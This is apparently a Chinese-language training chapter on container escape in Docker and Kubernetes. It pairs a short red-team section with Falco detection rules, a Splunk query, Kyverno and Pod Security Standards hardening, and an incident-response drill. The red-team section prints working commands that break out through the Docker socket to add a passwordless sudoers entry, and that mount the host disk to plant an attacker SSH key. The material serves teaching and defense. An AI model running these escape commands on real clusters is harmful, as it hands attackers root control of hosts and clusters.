# 05.3 容器逃逸機制與 Kubernetes 運行時威脅防禦 (Container Escape & K8s Runtime Security)

## 案發現場破題

在雲原生與微服務（Microservices）架構下，Docker 容器與 Kubernetes (K8s) 叢集承載了企業 80% 以上的核心業務。許多開發團隊為了除錯或掛載便利，隨意在 Pod 定義中開啟 `--privileged`（特權容器）或掛載主機敏感路徑（如 `/var/run/docker.sock`、`/` 根目錄）。攻擊者一旦攻陷該 Web Pod，即可透過 Linux 命名空間（Namespaces）、控制群組（cgroups）或未隔離的驅動程式與 Unix Socket，**直接逃逸出容器邊界，接管底層 Host 宿主機節點，並進一步橫向控制整個 Kubernetes 控制平面（Control Plane）**。

```
[攻擊者攻陷 Web Pod (獲得容器內 root 身分)]
       │
       ├── 發現容器掛載了 /var/run/docker.sock 或開啟了 --privileged
       ▼
[容器逃逸武器化利用 (Container Breakout)]
       │
       ├── 手法 A: docker run -v /:/host_root 建立後門容器直接覆寫宿主機 /etc/shadow
       ├── 手法 B: 濫用 CAP_SYS_ADMIN + cgroup release_agent 執行內核層提權代碼
       ▼
[取得 Host 宿主機 Linux Root 完全控制權]
       │
       ├── 讀取 /etc/kubernetes/admin.conf 或 kubelet 認證金鑰
       ▼
[完全接管 Kubernetes 叢集 (Kube-Apiserver Control Plane)]
```

### 痛點場景
- **容器特權泛濫（Over-privileged Containers）**：工程師誤以為「容器內部的 root 不是真 root」，忽視了在具備高 Linux Capabilities（如 `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`）時，容器邊界脆弱如紙。
- **傳統端點 EDR 盲區**：多數傳統防毒軟體運行於宿主機外圍，無法深入容器 OverlayFS 檔案層與虛擬網路介面（veth）即時監控容器內部的惡意行為。
- **K8s 服務帳號權杖（ServiceAccount Token）自動掛載**：預設情況下，每個 Pod 都自動掛載了對應的 SA Token（`/var/run/secrets/kubernetes.io/serviceaccount/token`），若 RBAC 權限未收斂，攻擊者能直接以此 Token 查詢或建立惡意 Pod。

## 第一動：容器逃逸四大核心途徑與原理 (Container Breakout Mechanisms)

```
+-----------------------------------------------------------------------------------------------+
| 容器逃逸常見手法對比                                                                           |
|                                                                                               |
| 1. Docker Socket 掛載逃逸 (DooD - Docker-outside-of-Docker)                                   |
|    - 觸發條件：容器掛載了宿主機的 /var/run/docker.sock                                        |
|    - 逃逸原理：直接利用宿主機 Docker Daemon API 建立掛載全域根目錄 / 的全新容器。            |
|                                                                                               |
| 2. 特權容器與 Capabilities 濫用 (Privileged Mode & CAP_SYS_ADMIN)                             |
|    - 觸發條件：Pod 定義 securityContext.privileged: true                                      |
|    - 逃逸原理：容器能直接存取宿主機所有實體硬體設備 (/dev/*)，可直接掛載宿主機磁碟分區。     |
|                                                                                               |
| 3. Linux 核心弱點逃逸 (Kernel Vulnerabilities)                                                |
|    - 觸發條件：宿主機 Linux 核心存在 Dirty COW (CVE-2016-5195) 或 Dirty Pipe (CVE-2022-0847)  |
|    - 逃逸原理：容器與宿主機共用 Linux Kernel，直接覆寫唯讀記憶體與 Host 檔案。                |
|                                                                                               |
| 4. 敏感路徑掛載逃逸 (Sensitive HostPath Mounts)                                               |
|    - 觸發條件：掛載了 /etc, /proc/sys, /root 等路徑                                           |
|    - 逃逸原理：直接向宿主機寫入 cron 定時任務 (/etc/crontab) 反彈 Shell。                     |
+-----------------------------------------------------------------------------------------------+
```

### 核心風險配置特徵

| 脆弱配置屬性 | 武器化利用途徑 (Exploitation) | 防禦阻斷標準 (Baseline) |
| :--- | :--- | :--- |
| **`securityContext.privileged: true`** | 啟用所有 Capabilities 並停用 AppArmor/SELinux。 | Pod Security Standards (PSS) 強制 Restricted 等級。 |
| **`/var/run/docker.sock`** | 呼叫 Docker Client 控制 Host 引擎。 | 嚴禁掛載 Docker Socket，改用 Kaniko 等無守護進程構建。 |
| **`hostPID: true`** | 容器能看見宿主機所有進程，可透過 `ptrace` 注入。 | 嚴格禁止共用宿主機 PID 命名空間。 |
| **`hostNetwork: true`** | 容器直接接管 Host 網路卡，繞過 NetworkPolicy。 | 嚴禁開放 HostNetwork。 |

## 第二動：紅隊利用模擬與逃逸重現 (Attack Emulation: Docker Socket & Privileged)

### 1. 利用 `/var/run/docker.sock` 逃逸到宿主機
在攻陷的容器內部，若存在掛載的 Docker Socket：
```bash
# 透過本機 curl 向 Docker API 發送請求，啟動一台將宿主機 / 掛載進去的逃逸容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["chroot","/host_root","sh","-c","echo \"attacker ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"],"Binds":["/:/host_root"]}'
```

### 2. 特權容器設備掛載逃逸
若容器具備 `--privileged` 權限：
```bash
# 在容器內直接查詢宿主機硬碟設備並掛載
fdisk -l
mkdir -p /mnt/host_disk
mount /dev/sda1 /mnt/host_disk

# 直接修改宿主機 SSH 授權金鑰
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... attacker@c2" >> /mnt/host_disk/root/.ssh/authorized_keys
```

## 第三動：eBPF 核心級執行期遙測與 Falco 部署 (Runtime Telemetry: Falco & Audit)

在雲原生架構中，必須在 Linux 核心層（Kernel-level）利用 eBPF 技術即時攔截系統呼叫（Syscalls）：

### 1. 部署 Falco 核心執行期偵測引擎
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco --set driver.kind=ebpf
```

### 2. 關鍵監控核心系統呼叫
- **`mount` / `umount2`**：容器內部發起非預期的磁碟掛載。
- **`ptrace`**：跨命名空間對宿主機程序進行記憶體讀取或代碼注入。
- **`openat` 讀取 `/var/run/docker.sock`**。

## 第四動：Falco 規則與 SIEM 關聯分析 (Falco Rules & Splunk SPL)

### 1. Falco 偵測規則：偵測容器內部存取 Docker Socket 或敏感設備
```yaml
- rule: Container Breakout Attempt via Docker Socket
  desc: Detect access to the docker socket inside a container indicating possible breakout
  condition: >
    spawned_process and container and
    (fd.name = "/var/run/docker.sock" or proc.cmdline contains "docker.sock")
  output: "CRITICAL: Container escape via docker.sock detected (user=%user.name pod=%k8s.pod.name container=%container.name cmd=%proc.cmdline)"
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation]

- rule: Sensitive Mount Inside Container
  desc: Detect attempts to mount host block devices inside a container
  condition: >
    evt.type = mount and container and
    (evt.arg.dev startswith "/dev/sd" or evt.arg.dev startswith "/dev/nvme")
  output: "CRITICAL: Host disk mount detected inside container (pod=%k8s.pod.name dev=%evt.arg.dev dir=%evt.arg.dir)"
  priority: CRITICAL
  tags: [container, breakout]
```

### 2. Splunk SPL：關聯 Falco 容器告警與 K8s 審計日誌 (AuditLogs)
```spl
index=falco_alerts priority="CRITICAL"
| stats count earliest(_time) as first_alert latest(_time) as last_alert 
        values(rule) as DetectedRules, values(cmd) as Commands by pod, container, namespace
| join type=inner pod [
    search index=k8s_audit verb IN ("create", "delete") 
    | rename requestURI as PodPath
    | fields pod, user.username, sourceIPs{}
  ]
| table first_alert, pod, container, namespace, DetectedRules, Commands, user.username
```

## 第五動：Kubernetes 安全基線加固與準入控制 (Admission Control: OPA/Gatekeeper)

```
[kubectl apply -f pod.yaml]
              │
              ▼
[Kube-Apiserver API] ──► [Validating Admission Webhook (Kyverno / OPA Gatekeeper)]
                                     │
                                     ├── 檢驗 1: securityContext.privileged == true? (DENY!)
                                     ├── 檢驗 2: 掛載 hostPath == /var/run/docker.sock? (DENY!)
                                     ├── 檢驗 3: runAsNonRoot == true? (ALLOW)
                                     ▼
                     [通過驗證 ➔ 允許排程至 Worker Node]
```

### 1. 強制啟用 Pod Security Standards (PSS Restricted)
在目標命名空間上強制啟用 Restricted 等級，徹底禁用特權容器與 HostPath：
```bash
kubectl label --overwrite ns production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest
```

### 2. Kyverno 政策：強制阻斷任何 HostPath 與 Docker Socket 掛載
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-host-path
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-host-path
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "嚴禁在生產 Pod 中掛載宿主機 hostPath 磁碟路徑！"
      pattern:
        spec:
          =(volumes):
            - X(hostPath): "null"
```

### 3. 停用不必要的 ServiceAccount Token 自動掛載
在 Pod 定義中明確宣告：
```yaml
spec:
  automountServiceAccountToken: false
```

## 靶場實戰：特權容器逃逸阻斷與 Falco 即時攔截演練

### 靶場環境情境
- **K8s 叢集節點**: `worker-node-01` (Ubuntu 22.04 LTS)
- **受害 Pod**: `billing-worker` (被誤設為 `privileged: true`)
- **警報觸發**: SOC 監控大屏接收到 Falco 核心層發出 CRITICAL 警報：`billing-worker` 正在嘗試掛載 `/dev/vda1`。

### 實戰步驟一：分析受害行為
1. 查詢 Falco 即時告警：
   `CRITICAL: Host disk mount detected inside container (pod=billing-worker dev=/dev/vda1 dir=/mnt/host)`
2. 確認攻擊者已突破容器邊界，嘗試直接向宿主機寫入後門。

### 實戰步驟二：自動化隔離與銷毀 (Containment)
1. **立即驅逐並強制刪除涉案 Pod**：
   ```bash
   kubectl delete pod billing-worker -n default --grace-period=0 --force
   ```
2. **將 `worker-node-01` 節點進行隔離（Cordon & Drain）**：
   ```bash
   kubectl cordon worker-node-01
   ```
3. 在宿主機層級清查 `/etc/passwd`、`/etc/shadow` 與 `authorized_keys` 時間戳，確認是否有未授權篡改。

### 實戰步驟三：加固阻斷
1. 在全叢集部署 Kyverno 阻斷規則，拒絕任何宣告 `privileged: true` 的工作負載部署。

## 過關驗收：實戰能力檢核清單 (Mastery Checklist)

- [ ] **逃逸機制剖析**：能深入解釋 Docker Socket 掛載、特權模式（Privileged Mode）與 HostPath 如何打破 Linux Namespaces 邊界。
- [ ] **eBPF 核心監控**：能正確部署並調優 Falco，監控容器內部的異常進程拉起與敏感設備掛載系統呼叫。
- [ ] **準入控制落地**：熟練掌握 Pod Security Standards (PSS) 與 Kyverno / Gatekeeper 策略編寫，能在部署前直接封殺高危 Pod。
- [ ] **K8s RBAC 收斂**：能在 Pod 規格中停用 `automountServiceAccountToken`，限制攻擊者獲取 API Server 認證憑證。
- [ ] **緊急事件處置**：能在偵測到逃逸告警後，3 分鐘內完成 Pod 銷毀、Node Cordon 隔離與宿主機系統完整性審計。
